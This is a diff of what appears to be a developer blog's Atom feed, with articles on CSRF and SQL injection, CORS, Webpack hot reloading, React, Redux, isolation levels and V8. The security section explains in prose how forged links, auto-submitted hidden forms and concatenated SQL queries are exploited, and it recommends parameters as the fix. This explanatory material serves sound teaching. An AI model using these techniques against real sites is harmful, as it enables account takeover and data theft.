+&lt;p&gt;This example is a bit contrived and oversimplified, but you get the picture. If the attacker can get the user to click on a link which points to that link &lt;strong&gt;while logged in&lt;/strong&gt;, that’s going to have the effect of changing the password for the user to whatever the attacker wants. This link can be part of an email, or it can be part of a message on a public board or a website set up by the attacker etc.&lt;/p&gt;
+
+&lt;p&gt;An action that changes the password will more likely be a POST than a GET, but that doesn’t make it CSRF-proof either, because a user can be tricked into submitting a form. Here’s how that would work: you could have a form with a hidden input like so:&lt;/p&gt;
+
+&lt;script src=&quot;https://gist.github.com/toaderflorin/6862d6a60d2dc4418a38fd81ae69e5bd.js&quot;&gt;&lt;/script&gt;
+
+&lt;p&gt;Using HTML forms with email is not really possible, because a lot of clients disable them or warn about them, but you could redirect the user to a page hosted somewhere. It turns out you don’t even have to trick him/her to click on the submit button, that can be done by the site using Javascript (say by reacting to the document load event).&lt;/p&gt;
+
+&lt;p&gt;How about PUT and DELETE? Turns out that the &lt;em&gt;same-origin policy&lt;/em&gt; helps us here, because attackers cannot do XHR requests from their site to the &lt;em&gt;http://www.thesite.com&lt;/em&gt;. It’s also why for POST attacks a form is being used instead of an POST XHR. SOP blocks that too.&lt;/p&gt;
+
+&lt;h2 id=&quot;sql-injection&quot;&gt;SQL Injection&lt;/h2&gt;
+&lt;p&gt;And last (in our article), but certainly not least, we have SQL injection. I think most of us remember this:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/exploit.png&quot; alt=&quot;exploit&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;For SQL injection to work, you’d have to be writing your SQL queries using string interpolation / concatenation.&lt;/p&gt;
+
+&lt;script src=&quot;https://gist.github.com/toaderflorin/e842b81f3e4d1fef85087134717a1571.js&quot;&gt;&lt;/script&gt;
+
+&lt;p&gt;As you can see, the text fits nicely in the query. The way you get around this is by using parameters, which are supported by all database systems.&lt;/p&gt;</content><author><name></name></author><summary type="html">I can testify that a lot of people confided in me they considered doing this (including yours truly) under the frustration of the bi-monthly administrative policies that mandated we change our workstation password:</summary></entry><entry><title type="html">CORS Made Simple</title><link href="http://localhost:4000/cors-made-simple" rel="alternate" type="text/html" title="CORS Made Simple" /><published>2017-09-09T06:39:37+03:00</published><updated>2017-09-09T06:39:37+03:00</updated><id>http://localhost:4000/cors-made-simple</id><content type="html" xml:base="http://localhost:4000/cors-made-simple">&lt;p&gt;CORS stands for &lt;em&gt;Cross-Origin Resource Sharing&lt;/em&gt; and if you’ve built rich client applications that communicate with an API via REST, you have probably crossed paths with something known as &lt;em&gt;same-origin policy&lt;/em&gt;. What this policy refers to is that an application cannot access resources via &lt;a href=&quot;https://www.w3schools.com/xml/xml_http.asp&quot;&gt;XMLHttpRequest&lt;/a&gt; or the &lt;a href=&quot;https://developers.google.com/web/updates/2015/03/introduction-to-fetch&quot;&gt;Fetch API&lt;/a&gt; that come from a different URL than where the page was originally served from.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/images/cors.png&quot; alt=&quot;cors&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
 
@@ -634,4 +420,263 @@ npm install cors --save
 
 &lt;script src=&quot;https://gist.github.com/toaderflorin/de8610422124cce393883120e77e150b.js&quot;&gt;&lt;/script&gt;
 
-&lt;p&gt;Configuring Rails to use CORS is equally easy.&lt;/p&gt;</content><author><name></name></author><summary type="html">CORS stands for Cross-Origin Resource Sharing and if you’ve built rich client applications that communicate with an API via REST, you have probably crossed paths with something known as same-origin policy. What this policy refers to is that an application cannot access resources via XMLHttpRequest or the Fetch API that come from a different URL than where the page was originally served from.</summary></entry></feed>
+&lt;p&gt;Configuring Rails to use CORS is equally easy.&lt;/p&gt;</content><author><name></name></author><summary type="html">CORS stands for Cross-Origin Resource Sharing and if you’ve built rich client applications that communicate with an API via REST, you have probably crossed paths with something known as same-origin policy. What this policy refers to is that an application cannot access resources via XMLHttpRequest or the Fetch API that come from a different URL than where the page was originally served from.</summary></entry><entry><title type="html">Hot Module Reloading With Wepack, React And Babel</title><link href="http://localhost:4000/react-hmr" rel="alternate" type="text/html" title="Hot Module Reloading With Wepack, React And Babel" /><published>2017-09-07T06:39:37+03:00</published><updated>2017-09-07T06:39:37+03:00</updated><id>http://localhost:4000/react-hmr</id><content type="html" xml:base="http://localhost:4000/react-hmr">&lt;p&gt;Here’s what most people that worked with Webpack would agree: setting it up is not exactly a walk in the park, especially if you are trying to do multiple things at once like transpiling from ES6, using hot reloading and proxying your backend. But that’s what I am trying to change with this article.&lt;/p&gt;
+
+&lt;p&gt;We are going to use the application we built in the &lt;a href=&quot;http://achiral.io/ruby-object-model&quot;&gt;previous article&lt;/a&gt; and add HMR to it. First of all, in order to use Hot Module Reloading in Webpack we must use the Webpack Dev Server which is essentially a Node / Express wrapper. Second, the HMR module doesn’t do a whole lot unless we are able to take advantage of it, and this is where the React HMR module comes in. Third, because we want to use ES6, we’ll be using the &lt;em&gt;babel-es2015-preset&lt;/em&gt; and we will be configuring a &lt;a href=&quot;https://webpack.js.org/concepts/#loaders&quot;&gt;loader&lt;/a&gt; for Webpack. Also we are going to use Babel to transpile the .jsx syntax.&lt;/p&gt;
+
+&lt;blockquote&gt;
+Webpack at its core is just a module bundler. It essentially detects dependencies between the building blocks of your application (like code files, style files etc.) and creates a bundle out of everything.
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/schematic.png&quot; alt=&quot;image-title-here&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;It doesn’t actually do things like transpilation — if you have Coffee-script code, Typescript or ES6 code, you will have to use a loader. We will be using &lt;em&gt;babel-loader&lt;/em&gt; to compile our ES6/jsx code and feed it into Webpack.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;
+&lt;img src=&quot;/images/webpack-schematic.png&quot; alt=&quot;image-title-here&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;On the other side of the chain there are &lt;a href=&quot;https://webpack.js.org/concepts/#plugins&quot;&gt;plugins&lt;/a&gt; like uglifyJS (which we’re not using in the code sample, but I’ve added it in the drawing as an example of a plugin), which is a Javascript minifier. Another plugin example is &lt;em&gt;webpack-dev-server&lt;/em&gt; which we will be using to implement hot reloading.&lt;/p&gt;
+
+&lt;h2 id=&quot;lets-jump-right-in&quot;&gt;Let’s Jump Right In&lt;/h2&gt;
+&lt;p&gt;The dependencies section of the &lt;em&gt;package.json&lt;/em&gt; file look like this:&lt;/p&gt;
+
+&lt;script src=&quot;https://gist.github.com/toaderflorin/a7470f4ca4cadea9e8bc86573ecc4215.js&quot;&gt;&lt;/script&gt;
+
+&lt;p&gt;Our &lt;em&gt;.babelrc&lt;/em&gt; file looks like this:&lt;/p&gt;
+
+&lt;script src=&quot;https://gist.github.com/toaderflorin/f2264a5abc5f1ee8904ff6b93aa18feb.js&quot;&gt;&lt;/script&gt;
+
+&lt;p&gt;And finally, let’s have a look at the Webpack configuration page.&lt;/p&gt;
+
+&lt;script src=&quot;https://gist.github.com/toaderflorin/cff7cfbc3619a8115c880a22c8530697.js&quot;&gt;&lt;/script&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;adding-hot-reloading&quot;&gt;Adding Hot Reloading&lt;/h2&gt;
+&lt;p&gt;Webpack Hot Module Replacement works by adding a small runtime to the generated bundle (which is going to run alongside your app) that constantly communicates with the server and if part of the dependency tree changes, it will inject the new dependencies. However, in order for this process to take place, we need to setup the Webpack Development Server, which means we need to add the following lines of code in the &lt;em&gt;webpack.config.js&lt;/em&gt; file in the configuration object.&lt;/p&gt;
+
+&lt;pre&gt;
+plugins: [
+  new webpack.HotModuleReplacementPlugin()
+],
+devServer: {  
+  proxy: {
+    '*': 'http://localhost:3000'
+  },
+  hot: true,
+  contentBase: './src/static',
+  port: 9000   
+}
+&lt;/pre&gt;
+
+&lt;p&gt;Second, we actually need React to &lt;strong&gt;do something&lt;/strong&gt; when the bundle changes, which is where the &lt;em&gt;react-hot-loader&lt;/em&gt; package comes into play. A module can only be updated if you “accept” it. So you need to &lt;em&gt;module.hot.accept()&lt;/em&gt; the module in the parents or the parents of the parents.&lt;/p&gt;
+
+&lt;p&gt;Have a look at the following code:&lt;/p&gt;
+
+&lt;script src=&quot;https://gist.github.com/toaderflorin/d4d9e62d2b36d768bbefc78c7c084817.js&quot;&gt;&lt;/script&gt;
+
+&lt;p&gt;You can find the source code &lt;a href=&quot;https://github.com/toaderflorin/react-hmr&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;</content><author><name></name></author><summary type="html">Here’s what most people that worked with Webpack would agree: setting it up is not exactly a walk in the park, especially if you are trying to do multiple things at once like transpiling from ES6, using hot reloading and proxying your backend. But that’s what I am trying to change with this article.</summary></entry><entry><title type="html">Simple Component Based Architecture With React</title><link href="http://localhost:4000/component-architecture" rel="alternate" type="text/html" title="Simple Component Based Architecture With React" /><published>2017-08-22T06:39:37+03:00</published><updated>2017-08-22T06:39:37+03:00</updated><id>http://localhost:4000/component-architecture</id><content type="html" xml:base="http://localhost:4000/component-architecture">&lt;p&gt;I normally wouldn’t have wrote this article as I find what I am about to present quite straightforward, but I’ve heard this sentence (or something along those lines) multiple times: &lt;em&gt;Let’s not use React because it would be an overkill for our application. We would have to use Flux / Redux and it’s too much for what we need.&lt;/em&gt; No, you don’t,  and this is important: React is just a view layer. Flux is an architectural pattern, but it doesn’t mean you have to use it if you are using React and you can also use Flux even if you are using another library—in fact it’s quite popular to use Flux with Angular. React (just like Angular 2+) is built around components, and building a web application out of components is perfectly feasible, as I will show.&lt;/p&gt;
+
+&lt;p&gt;Our goal for this demo app is to avoid using a separate store to keep the application architecture simple, but at the same time we want to avoid things like partial page updates or a lot of stateful event based interactions which lead to spaghetti like dependencies in our code. Here’s an example of interaction I’ve unfortunately encountered all too often in UI code:&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;The user changes a text input field which triggers a handler. That handler does some processing and does some partial updates in some other part of the UI which in turn triggers another set of events, which trigger more processing and more UI updating etc.&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/big-ball.png&quot; alt=&quot;big-ball&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;You can quickly see that this kind of approach becomes unwieldy quite fast, so we are going to do two things to mitigate this:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;We will keep the whole application state as the state of the top level &lt;em&gt;App&lt;/em&gt; component.&lt;/li&gt;
+  &lt;li&gt;We are going to use a &lt;em&gt;top-down&lt;/em&gt; approach, were the top level component acts as a sort of manager and coordinates what’s happening.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Because components naturally form a hierarchy, we can use that hierarchy to act like sort of a &lt;em&gt;chain of command&lt;/em&gt;. What we are trying to avoid here is components talking &lt;em&gt;directly to one another&lt;/em&gt;, because that would mean NxN complexity and partial page updates. What they should do instead is they should communicate through their superior — that would mean receiving commands (like display this data) and sending notifications up the hierarchy (action X has been performed by the user like submitting a form, for example).&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/dilbert.jpg&quot; alt=&quot;dilbert&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So no component should tell other component (on the same hierarchical level) it’s a piece of garbage &lt;em&gt;directly&lt;/em&gt;. But it’s OK if a component “higher in command” does it.&lt;/p&gt;
+
+&lt;h2 id=&quot;the-application&quot;&gt;The Application&lt;/h2&gt;
+
+&lt;p&gt;We are going to build an application that allows a user to manage a list of todos. For the sake of simplicity, we are going to have a backend that globally manages a collection of tasks, so we don’t support multiple users. The application is meant to be run locally and we will demonstrate how to structure it with components. Here’s a sketch of what we want our application to look like:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/sketch.png&quot; alt=&quot;sketch&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The dotted lines indicate how we want to split our application into smaller pieces—the components that are going to make up the application. This means we get this hierarchy:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/hierarchy.png&quot; alt=&quot;hierarchy&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;
+Codewise, this is what the top level component looks like:&lt;/p&gt;
+
+&lt;script src=&quot;https://gist.github.com/toaderflorin/f16af2f7d587cd628e45543b34c0b446.js&quot;&gt;&lt;/script&gt;
+
+&lt;p&gt;As you can see, it contains the methods for adding and removing todos. These are passed down as props to the &lt;em&gt;AddTask&lt;/em&gt; and &lt;em&gt;TaskList&lt;/em&gt; components respectively.&lt;/p&gt;
+
+&lt;p&gt;Here is the &lt;em&gt;AddTask&lt;/em&gt; component:&lt;/p&gt;
+
+&lt;script src=&quot;https://gist.github.com/toaderflorin/acf3aa438d747ff6fde2250ba976a897.js&quot;&gt;&lt;/script&gt;
+
+&lt;p&gt;&lt;strong&gt;Important:&lt;/strong&gt; You might have been worried about sending all that information up the chain of command. Turns out that we don’t need to notify the &lt;em&gt;App&lt;/em&gt; component for every keystroke that changes the input field, no need to bother the boss with irrelevant information every half a second or so. That’s why this component is going to have &lt;em&gt;some private state&lt;/em&gt; of its own. Since we have to track the value of the input field component and we will be reacting on the &lt;em&gt;onChanged&lt;/em&gt; event of the input in order to keep the state and the input value in sync. We also won’t be able to use a functional (stateless) component here because of this.&lt;/p&gt;
+
+&lt;p&gt;And last but not least, the list of tasks:&lt;/p&gt;
+
+&lt;script src=&quot;https://gist.github.com/toaderflorin/70e6cbc872f55cf9cfe3fdf546fb1178.js&quot;&gt;&lt;/script&gt;
+
+&lt;p&gt;and…&lt;/p&gt;
+
+&lt;script src=&quot;https://gist.github.com/toaderflorin/6ab7f1bbf8faa03609b7df11332a83be.js&quot;&gt;&lt;/script&gt;
+
+&lt;p&gt;It is desirable to use functional components whenever possible. Not only are they easier to write and the code is more succinct, but the fact that don’t handle their own state is also advantageous. The &lt;em&gt;TaskList&lt;/em&gt; component just passes the &lt;em&gt;deleteTaskClick&lt;/em&gt; handler through to the &lt;em&gt;Task&lt;/em&gt; component. We are using a similar bind approach here, as we did for &lt;em&gt;AddTask&lt;/em&gt;.&lt;/p&gt;
+
+&lt;p&gt;The code was slightly tweaked and simplified for legibility, download the full version &lt;a href=&quot;https://github.com/toaderflorin/florintoader&quot;&gt;here&lt;/a&gt;. And of course, this is a very simple application — if you are using a component based approach, you will probably have multiple “levels of command” in the component hierarchy, similar to what you would have in a big organization. You need to use your judgement in designing the application state, splitting it into components, assigning responsibilities to each and splitting the state accordingly. You might however reach the conclusion that it’s worth using Redux / Flux as the application gets larger.&lt;/p&gt;</content><author><name></name></author><summary type="html">I normally wouldn’t have wrote this article as I find what I am about to present quite straightforward, but I’ve heard this sentence (or something along those lines) multiple times: Let’s not use React because it would be an overkill for our application. We would have to use Flux / Redux and it’s too much for what we need. No, you don’t, and this is important: React is just a view layer. Flux is an architectural pattern, but it doesn’t mean you have to use it if you are using React and you can also use Flux even if you are using another library—in fact it’s quite popular to use Flux with Angular. React (just like Angular 2+) is built around components, and building a web application out of components is perfectly feasible, as I will show.</summary></entry><entry><title type="html">The Redux Async Flow And Handling Side Effects</title><link href="http://localhost:4000/redux-async-flow" rel="alternate" type="text/html" title="The Redux Async Flow And Handling Side Effects" /><published>2017-07-20T06:39:37+03:00</published><updated>2017-07-20T06:39:37+03:00</updated><id>http://localhost:4000/redux-async-flow</id><content type="html" xml:base="http://localhost:4000/redux-async-flow">&lt;p&gt;The first thing that needs to be mentioned is that Redux, while &lt;em&gt;fluxish&lt;/em&gt; in nature, is not an exact canonical implementation of the Flux architecture. Instead of using a dispatcher that sends actions to multiple stores, it uses &lt;strong&gt;a single store&lt;/strong&gt; which keeps the state for the whole application, and a concept known as a &lt;em&gt;reducer&lt;/em&gt; which is essentially a function that gets the current state and an action, and produces a new state based on the action.&lt;/p&gt;
+
+&lt;p&gt;It looks something like this:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/redux.png&quot; alt=&quot;redux&quot; class=&quot;img-responsive center-image&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Redux is heavily inspired by Elm, which is a functional programming language, and it takes quite a few cues from it—the application
+state reducer (in a real application, we are actually chaining multiple reducers into a big one, because otherwise the whole thing would become
+unwieldy very fast), needs to be a &lt;em&gt;pure&lt;/em&gt; function - which means it’s not allowed to have &lt;em&gt;side-effects&lt;/em&gt;. An action is just a plain object - the only requirement is that this object has to have a &lt;em&gt;type&lt;/em&gt; property. An action creator is just a plain JS function that returns an action object. It looks something like this:&lt;/p&gt;
+
+&lt;script src=&quot;https://gist.github.com/toaderflorin/dbd3ad78285ecd7decfec8cd88877eb3.js&quot;&gt;&lt;/script&gt;
+
+&lt;p&gt;And a reducer would look something like this:&lt;/p&gt;
+
+&lt;script src=&quot;https://gist.github.com/toaderflorin/7c5ad3feedd8d6047cf29fb27efa9782.js&quot;&gt;&lt;/script&gt;
+
+&lt;p&gt;This is the Redux &lt;em&gt;synchronous flow&lt;/em&gt;. Obviously, real world applications are more complicated than that because the client needs to sync with
+the server, which means there are side-effects, but before we look at the async flow, let’s get into…&lt;/p&gt;
+
+&lt;h2 id=&quot;a-bit-of-functional-programming&quot;&gt;A Bit Of Functional Programming&lt;/h2&gt;
+
+&lt;p&gt;Let’s explore the concepts of pure / unpure functions and side-effects by looking at some code:&lt;/p&gt;
+
+&lt;script src=&quot;https://gist.github.com/toaderflorin/867f25d45b36c65b8b409e3eca851091.js&quot;&gt;&lt;/script&gt;
+
+&lt;p&gt;If you worked with the standard Flux implementation by Facebook, you might have come across the concept of &lt;em&gt;action creators&lt;/em&gt;. They are just normal JavaScript functions that return an action, which can be any type of JS object in Redux, the only requirement is to have a &lt;em&gt;type&lt;/em&gt; property of type string. The first function is &lt;em&gt;pure&lt;/em&gt; because it’s return result is &lt;strong&gt;always&lt;/strong&gt; reproducible for the same input parameter, which is not the case for the second function.&lt;/p&gt;
+
+&lt;p&gt;Now have a look at the following function:&lt;/p&gt;
+
+&lt;script src=&quot;https://gist.github.com/toaderflorin/96c280e5330d84851f103710ed381524.js&quot;&gt;&lt;/script&gt;
+
+&lt;p&gt;This function is said to have side-effects, because it changes a global variable which then changes the return value on subsequent
+calls. Obviously, functions that have side-effects are not pure.&lt;/p&gt;
+
+&lt;p&gt;We went over the basic Flux architecture and some simple functional concepts. However in the real world, web applications are rarely this simple.
+This initial architecture diagram is missing an essential aspect: server-side access. Obviously, this introduces side-effects, so as a result, the reducers
+won’t be pure anymore.&lt;/p&gt;
+
+&lt;h2 id=&quot;enter-redux-thunk&quot;&gt;Enter Redux Thunk&lt;/h2&gt;
+
+&lt;p&gt;Since Redux allows for custom middleware, we can use something called &lt;em&gt;Redux Thunk&lt;/em&gt; to help us. It is important to be aware that without
+middleware, Redux only supports a synchronous flow. So what is a &lt;em&gt;thunk&lt;/em&gt;? It’s just a function - it wraps an expression, so you can delay
+the evaluation of the result of that expression. Here’s a code sample straight from the library documentation:&lt;/p&gt;
+
+&lt;script src=&quot;https://gist.github.com/toaderflorin/7961dfce75a8d1748b4192e3d16ed611.js&quot;&gt;&lt;/script&gt;
+
+&lt;p&gt;How does this help us you might ask?&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;If you pass an expression as a parameter to another function, it will get evaluated within the same JavaScript event tick. If you pass a &lt;strong&gt;thunk&lt;/strong&gt;
+however, that function can evaluate it whenever it wants. This means you can do &lt;strong&gt;async&lt;/strong&gt; stuff easily.&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;And this is important because modern web applications are mostly asynchronous in their nature - you usually build a rich responsive client which communicates with an API. This means when the user presses a button, or does something that needs fetching data, you usually show spinners and such. The standard way to handle this is using the Redux &lt;em&gt;Thunk middleware&lt;/em&gt;.&lt;/p&gt;
+
+&lt;p&gt;This is how you set it up:&lt;/p&gt;
+
+&lt;script src=&quot;https://gist.github.com/toaderflorin/b4754731b7a7ed4967cc7fcbb0fb3d9e.js&quot;&gt;&lt;/script&gt;
+
+&lt;p&gt;So instead of dispatching normal action objects, we will be dispatching &lt;em&gt;async actions&lt;/em&gt;, or thunks. This means we have have to change our action creators to return functions instead of plain objects. Let us make a request to the server, and see how that would work. Obviously, that is an asynchronous action because it takes some time, and we might also want to show some sort of indication to the user that the request is ongoing - something like a spinner. And now let’s add the asynchronous action.&lt;/p&gt;
+
+&lt;p&gt;We are using &lt;strong&gt;axios&lt;/strong&gt;, a popular framework for making http requests.&lt;/p&gt;
+
+&lt;script src=&quot;https://gist.github.com/toaderflorin/4519a92c396ee2bb912bece07983a2cc.js&quot;&gt;&lt;/script&gt;
+
+&lt;p&gt;The reducer is going to receive the sync actions dispatched and will take appropriate steps to reduce the application step. The async actions are the place where we are handling the “dirty” stuff, like making an http request.&lt;/p&gt;
+
+&lt;p&gt;For the sake of simplicity, I chose to dispatch the actions inline, but we could (and should) extract them in a different action creator method. I also used the same action called &lt;em&gt;GET_ITEMS&lt;/em&gt;, but you could use different actions for indicating the start, end and a potential error occurence in the occurrence eration.&lt;/p&gt;</content><author><name></name></author><summary type="html">The first thing that needs to be mentioned is that Redux, while fluxish in nature, is not an exact canonical implementation of the Flux architecture. Instead of using a dispatcher that sends actions to multiple stores, it uses a single store which keeps the state for the whole application, and a concept known as a reducer which is essentially a function that gets the current state and an action, and produces a new state based on the action.</summary></entry><entry><title type="html">Relational Database Isolation Levels Explained</title><link href="http://localhost:4000/isolation-levels" rel="alternate" type="text/html" title="Relational Database Isolation Levels Explained" /><published>2017-07-02T06:39:37+03:00</published><updated>2017-07-02T06:39:37+03:00</updated><id>http://localhost:4000/isolation-levels</id><content type="html" xml:base="http://localhost:4000/isolation-levels">&lt;p&gt;This seems to be a murky concept for a lot of developers, so I thought I
+would give a simple explanation. The concept of isolation is related to what happens when two or more transactions attempt to access (read and write) the same data at the same time.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/levels.png&quot; alt=&quot;levels&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The SQL standard defines four isolation levels:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Read uncommitted&lt;/li&gt;
+  &lt;li&gt;Read committed&lt;/li&gt;
+  &lt;li&gt;Repeatable reads&lt;/li&gt;
+  &lt;li&gt;Serializable&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Most developers can explain the difference between Read committed and Serializable—between no locking at all and full locking. To understand the intermediary isolation levels, one needs to understand the difference between &lt;em&gt;dirty reads, non repeatable reads, and phantom reads&lt;/em&gt;.&lt;/p&gt;
+
+&lt;p&gt;Let’s try to explain them one by one.&lt;/p&gt;
+
+&lt;h2 id=&quot;dirty-reads&quot;&gt;Dirty Reads&lt;/h2&gt;
+
+&lt;p&gt;A dirty read is the simplest form of a problem that can occur. It means that a transaction can read the changes of another transaction, before that transaction has committed those changes. If a transaction is doing some calculations on a data row (say, part of a stored procedure), and stores the intermediary values of the calculation in the database, the other transactions will see this intermediary data.&lt;/p&gt;
+
+&lt;p&gt;This is the &lt;strong&gt;read uncommitted&lt;/strong&gt; isolation level.&lt;/p&gt;
+
+&lt;h2 id=&quot;non-repeatable-reads&quot;&gt;Non Repeatable Reads&lt;/h2&gt;
+
+&lt;p&gt;A non repeatable read offers a bit more protection. Other transactions only see data once it is committed. There is however the problem that while a transaction is running, another transaction might have changed and committed the value for a certain row in the meantime. If a row is accessed multiple times during to course of a transaction, that transaction might see different values for the same row.&lt;/p&gt;
+
+&lt;p&gt;This is the &lt;strong&gt;read committed&lt;/strong&gt; isolation level.&lt;/p&gt;
+
+&lt;p&gt;The repeatable reads isolation level solves the previous problem. In this case, when a transaction reads a row, it also locks it so that no other transaction will be able to modify it until the current transaction is finished. This way it avoids the case where the value can be changed, but it also introduces more contention in the database because transactions now have to wait more after one another.&lt;/p&gt;
+
+&lt;h2 id=&quot;phantom-reads&quot;&gt;Phantom Reads&lt;/h2&gt;
+
+&lt;p&gt;Then there is the problem of phantom reads. So far, all the locking was done on the row level, to prevent issues with updates on data items. But let’s consider another scenario: a transaction doesn’t change existing items in a table, but instead inserts new items. Other long running transactions might query this table multiple times during their execution and get different collections.&lt;/p&gt;
+
+&lt;p&gt;The serializable isolation solves this problem in a similar way to the previous isolation level. When reading data, it also places a lock on it—the difference is that instead of placing data on a row, it places a lock on a range.&lt;/p&gt;
+
+&lt;p&gt;This range is based on the query - for example:&lt;/p&gt;
+
+&lt;script src=&quot;https://gist.github.com/toaderflorin/181e34df07fcb647671e9512c3e276bf.js&quot;&gt;&lt;/script&gt;
+
+&lt;p&gt;Obviously, this introduces even more contention.&lt;/p&gt;</content><author><name></name></author><summary type="html">This seems to be a murky concept for a lot of developers, so I thought I would give a simple explanation. The concept of isolation is related to what happens when two or more transactions attempt to access (read and write) the same data at the same time.</summary></entry><entry><title type="html">Under The Hood: V8 Internals</title><link href="http://localhost:4000/v8-internals" rel="alternate" type="text/html" title="Under The Hood: V8 Internals" /><published>2017-06-16T06:39:37+03:00</published><updated>2017-06-16T06:39:37+03:00</updated><id>http://localhost:4000/v8-internals</id><content type="html" xml:base="http://localhost:4000/v8-internals">&lt;p&gt;&lt;img src=&quot;/images/chrome.png&quot; alt=&quot;chrome&quot; class=&quot;img-responsive img-left&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Dynamic languages get a lot of love in the startup community, and it’s not hard to see why—they are mostly open source, they are cross platform, and it’s very easy get an application up and running because their syntax tends to be very terse, and you can write a lot of functionality with very little code. But as a wise man used to say, with great power comes great responsibility, and as great as Ruby on Rails is, it’s no secret that Ruby is not exactly fast—depending on the benchmark you’re using, it’s about two orders of magnitude (that’s 100 times) slower than something like Java. Of course as a whole, RoR applications are not that slow because a lot of execution time is spent in native extensions such as querying the database—Ruby and Rails only serve the purpose of gluing stuff together. Nevertheless, more and more companies are moving from Rails to node.js or Go, and they are doing it for performance reasons / scalability. Another reason to use node.js is the fact that you can share code between the server-side and the client-side, but I digress.&lt;/p&gt;
+
+&lt;p&gt;For those who have not used node.js, it uses Google’s V8 JavaScript engine which powers Chrome, and it’s fast. And the reason why it’s fast is because it actually compiles you JS code instead of interpreting it. The whole process works as follows:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;V8 evaluates the JavaScript in your file and does just-in-time compilation to machine code using a compiler that’s designed to compile as fast as possible, and then stores the compiled code for that portion of the program.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;V8 also maintains a hot-map of the code that runs. If it sees functions being run several times, it will use a second compiler which optimizes your code, but it’s slower.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;The engine also relies heavily on making assumptions about your code, and optimizing preemptively.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;What’s interesting is that V8 doesn’t treat objects as hash-tables, as most JS engines do—it instead creates a sort of struct with the properties of the object, which it calls a hidden class. You can think of this hidden class as similar to Ruby’s eigenclasses.&lt;/p&gt;
+
+&lt;script src=&quot;https://gist.github.com/toaderflorin/6dafc797abe6a17bb7d63d8d94e22fb5.js&quot;&gt;&lt;/script&gt;
+
+&lt;p&gt;If you add a new property to obj1, V8 is no longer able map the properties of the object to the same hidden class, so it will create a new one. V8 also tries to preemptively optimize your code and it does so by looking for repetitions.&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;JavaScript is a dynamic language but the more you are using it as a statically typed language, the better of you are when it comes to optimizations.&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;If you are using ES6 (and I recommend that you do because there are great transpilation / bundling tools such as Babel and Webpack, not to mention the current version of node.js 7.10 has native support for classes, lambdas, await/async and a lot of other nifty stuff)— I suggest you use classes to structure your project, and use getters and setters.&lt;/p&gt;
+
+&lt;script src=&quot;https://gist.github.com/toaderflorin/eb5fb6e45dd943a3f6ad87da7f1fe827.js&quot;&gt;&lt;/script&gt;
+
+&lt;p&gt;Of course, there’s nothing preventing you from modifying the “private” fields in JavaScript (except maybe a code review from your technical lead), and also there is nothing preventing you from adding new properties to the object (except using Object.freeze() but this has a performance penalty). Not only will this give you better encapsulation, but it will speed up your code because V8 is able to optimize it better. Of course, if you really want to have private members and proper static (compile time) type checking, you can use Facebook’s Flow, or Microsoft’s TypeScript.&lt;/p&gt;
+
+&lt;p&gt;Also, a lot of developers tend to use plain JS objects as dictionaries because objects are key-value pairs. However, knowing how the V8 compiler optimizer works, that’s not a very good idea. Computed property names are also problematic for the optimizer, and they make code also hard to understand, so they should be avoided. The Map object is great, if you need to use key-value pairs.&lt;/p&gt;
+
+&lt;p&gt;Another word of caution: be extra careful with arrays. Check out the following code:&lt;/p&gt;
+
+&lt;script src=&quot;https://gist.github.com/toaderflorin/2b22591a73bd61ad4b07dec88fdae5b7.js&quot;&gt;&lt;/script&gt;
+
+&lt;p&gt;As long as an array doesn’t have holes in it, it’s going to be treated as a contiguous memory area, which makes the code using it fast. However, if you get fancy like in the example above, you are going to have a sparse array, and V8 will convert it to a hash-table, which will make writing and reading slower.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;tldr;&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;The closer your JavaScript program is to static typed code, the better V8 is going to be able to optimize your code using static analysis. You can use TypeScript / Facebook Flow to enforce this.&lt;/p&gt;</content><author><name></name></author><summary type="html"></summary></entry></feed>
